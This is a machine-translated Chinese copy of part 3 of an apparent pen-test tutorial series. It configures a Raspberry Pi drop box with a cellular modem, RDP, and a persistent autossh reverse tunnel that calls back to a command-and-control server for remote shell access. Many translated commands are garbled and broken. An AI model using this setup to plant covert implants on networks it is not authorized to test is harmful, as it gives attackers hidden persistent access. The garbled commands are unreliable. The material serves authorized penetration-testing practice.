<html>
<head>
<title>Part 3: The Ultimate Pen Test Drop Box Walkthrough— Adding a Cellar Backlink</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">第3部分:最终的笔测试投件箱演练—添加一个单元格反向链接</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/part-3-pen-test-dropbox-adding-a-cellar-backlink-8c8d5cfde667?source=collection_archive---------1-----------------------#2021-09-28">https://infosecwriteups.com/part-3-pen-test-dropbox-adding-a-cellar-backlink-8c8d5cfde667?source=collection_archive---------1-----------------------#2021-09-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="f9b1" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">为蜂窝卡安装所需的依赖项</h1><p id="bf7d" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">安装依赖项的命令:</p><p id="e13a" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; apt-get安装kali<strong class="kn ir">pi</strong>-kernel-header</p><p id="43e3" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; curl-L--output/usr/bin/rpi-update<a class="ae lo" href="https://raw.githubusercontent.com/Hexxeh/rpi-update/master/rpi-update" rel="noopener ugc nofollow" target="_blank">https://raw . githubusercontent . com/hex xeh/rpi-update/master/rpi-update</a>&amp;&amp;sudo chmod+x/usr/bin/rpi-update</p><p id="fc9b" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">忽略警告，键入“y”接受安装/更新。</p><h1 id="bc67" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">向Twilio注册您的蜂窝卡</h1><p id="a281" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">点击<a class="ae lo" href="https://www.twilio.com/console" rel="noopener ugc nofollow" target="_blank">此处</a>并设置您的卡(或按照SIM卡附带的说明操作)</p><p id="3f9c" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; wget<a class="ae lo" href="https://raw.githubusercontent.com/sixfab/Sixfab_RPi_3G-4G-LTE_Base_Shield/master/tutorials/QMI_tutorial/qmi_install.sh" rel="noopener ugc nofollow" target="_blank">https://raw . githubusercontent . com/six fab/six fab _ RPi _ 3G-4G-LTE _ Base _ Shield/master/tutorials/QMI _ tutorial/qmi _ install . sh</a>&amp;&amp;sudo chmod 755 qmi _ install . sh</p><p id="6437" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; vim qmi_install.sh(更改所有文件目录以匹配您所拥有的，因为文件路径是硬编码的)</p><p id="bb14" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; wget<a class="ae lo" href="https://raw.githubusercontent.com/sixfab/Sixfab_RPi_3G-4G-LTE_Base_Shield/master/tutorials/QMI_tutorial/install_auto_connect.sh" rel="noopener ugc nofollow" target="_blank">https://raw . githubusercontent . com/six fab/six fab _ RPi _ 3G-4G-LTE _ Base _ Shield/master/tutorials/QMI _ tutorial/install _ auto _ connect . sh</a></p><p id="7dd8" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">sudo chmod+x install _ auto _ connect . sh</p><p id="fed7" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; install_auto_connect.sh(完成后需要重新启动)</p><p id="3617" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; CD/home/[您的用户名]/files/quectel-CM</p><p id="6bce" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt;./克特尔-CM-s wireless.twilio.com</p><p id="a731" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt;重新启动</p><p id="a317" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; vim /usr/src/qmi_reconnect.sh</p><p id="d5bd" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; sudo systemctl状态qmi_reconnect.service</p><p id="9acc" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; sudo重启</p><h1 id="733f" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">设置RDP访问权限(如果您愿意的话)</h1><p id="1c72" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">&gt; apt install-y xrdp tigervnc-standalone-server</p><p id="9cdf" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; systemctl使能xrdp</p><p id="eab2" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; systemctl重启xrdp</p><p id="3f60" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; systemctl启用xrdp-sesman.service</p><h1 id="6af7" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">在PI上设置自动SSH回调</h1><p id="596b" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">从Pi生成一个新的SSH密钥对。</p><p id="2926" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; ssh-keygen</p><p id="677e" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">然后将您的密钥复制到CnC服务器。</p><p id="dde3" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; ssh-copy-id-I/path/to/your/public/key-p 22 lessprivuser @ CnC _ Server _ IP</p><p id="5e62" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">安装自动清洗。</p><p id="cb2f" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; apt安装自动清洗</p><p id="a70c" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">创建一个运行autossh命令的服务来构建反向shell。</p><p id="b3db" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; vim/etc/systemd/system/r tunnel . service</p><p id="912f" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">输入以下所有内容并编辑CNC_Server_IP:</p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><p id="c5ef" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【单位】</em></p><p id="3337" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">描述= AutoSSH反向隧道</em></p><p id="47a6" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw"> After=routes.service </em></p><p id="d5f3" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【服务】</em></p><p id="ce4e" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">Environment = " autosh _ gate time = 0 "</em></p><p id="19c0" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">ExecStartPre =/bin/sleep 30</em></p><p id="2ca7" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">ExecStart =/usr/bin/autos sh-m0-N-o " ServerAliveInterval 60 "-o " ServerAliveCountMax 3 "-o stricthostkey checking = false-o " connect time out 10 "-o " exitonfordfailure yes "-R 2222:localhost:22[</em><strong class="kn ir"><em class="lw">lessprigledgeduser</em></strong><em class="lw">@</em><strong class="kn ir"><em class="lw">CnC _ Server _ IP</em></strong><em class="lw">]</em></p><p id="d3d4" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">重启=开-故障</em></p><p id="3118" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">重启秒=5s </em></p><p id="8bce" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【安装】</em></p><p id="45d8" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">多用户目标</p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><p id="ed72" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">为您的PI创建一个路由，以构建一个到CnC服务器的SSH。</p><p id="00e4" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">vim/etc/systemd/system/routes . service</p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><p id="4c58" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【单位】</em></p><p id="5953" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">描述=持续路线</em></p><p id="9eab" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw"> After=twilio.service </em></p><p id="0a61" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【服务】</em></p><p id="bf08" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">ExecStartPre =/bin/sleep 20</em></p><p id="22dd" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">ExecStart =/sbin/route add-net[</em><strong class="kn ir"><em class="lw">YOUR _ CnC _ Server _ IP</em></strong><em class="lw">]net mask 255 . 255 . 255 . 255 . dev wwan 0</em></p><p id="c843" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【安装】</em></p><p id="4145" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">wanted by =多用户.目标</em></p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><p id="cee6" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">创建一个在启动时运行以激活手机网络连接的服务。</p><p id="b873" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; vim/etc/systemd/system/twilio . service</p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><p id="1e9f" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【单位】</em></p><p id="6fab" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">描述=蜂窝互联网z </em></p><p id="1f49" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【服务】</em></p><p id="5d9a" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">ExecStart =/home/[用户名]/files/que ctel-CM/que ctel-CM-s internet；udpcpc -i wwan0 </em></p><p id="848b" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">【安装】</em></p><p id="1349" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lw">wanted by = multi-user . target</em></p></div><div class="ab cl lp lq hu lr" role="separator"><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu lv"/><span class="ls bw bk lt lu"/></div><div class="ij ik il im in"><h1 id="9691" class="jn jo iq bd jp jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk bi translated">可选预防措施</h1><p id="8774" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">为了防止SSH挂起妨碍将来的连接，您需要设置一个cron作业，每小时(或者您觉得合适的任何时间间隔)重新启动投件箱。</p><p id="f661" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; crontab -e</p><p id="4314" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; */60 * * * * root关机-r</p><figure class="md me mf mg gt mh gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/579571db3a4277598cc7a07b396f061e.png" data-original-src="https://miro.medium.com/v2/resize:fit:912/format:webp/1*psDQgWIRUkNPQUFN_v8Izw.png"/></div><figcaption class="mk ml gj gh gi mm mn bd b be z dk translated">Crontab条目</figcaption></figure><h1 id="3fee" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">轻松跳到投件箱</h1><p id="2f5c" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">&gt; ssh[用户]@[数控地址]</p><figure class="md me mf mg gt mh gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/8d545223c581e5497ca2d4085dd564ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*QE3AAyRLjqZRlGyPgu-qPg.png"/></div></figure><p id="d431" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">&gt; ssh[user]@ localhost-p[PORT _ IMPLANT _ CONNECTED _ TO _ CNC _ ON]</p><figure class="md me mf mg gt mh gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/e2068a860ebb0f8cc403e37bf5600c3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*GxtMDRa9BDsPbsFnB-j7gQ.png"/></div></figure><h1 id="4d01" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">植入物/接线盒的最终接口</h1><figure class="md me mf mg gt mh gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/90c2e504fa186e451246cf4be015977b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*gsRMyXnUUJlI1qWXHF_dUA.png"/></div><figcaption class="mk ml gj gh gi mm mn bd b be z dk translated">最终网络接口</figcaption></figure><p id="79e1" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">返回到:<br/>第1部分:<a class="ae lo" href="https://killbit.medium.com/part-1-build-a-cloud-based-command-and-control-server-and-attack-drop-box-with-a-cellular-b3e9e063dedd" rel="noopener">构建一个基于云的命令和控制服务器，并用蜂窝反向链接攻击投件箱</a></p><p id="c574" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">第2部分:<a class="ae lo" href="https://killbit.medium.com/part-2-build-the-pen-test-drop-box-69278526886a" rel="noopener">构建笔测试下拉框</a></p><p id="1f53" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">如果你喜欢我的内容和我在这里提供的工作，请考虑发送一些咖啡爱我的方式@<a class="ae lo" href="https://www.buymeacoffee.com/killbit" rel="noopener ugc nofollow" target="_blank">https://www.buymeacoffee.com/killbit</a></p><p id="f09e" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">你友好的邻居黑客，</p><p id="6378" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">杀手</p></div></div>    
</body>
</html>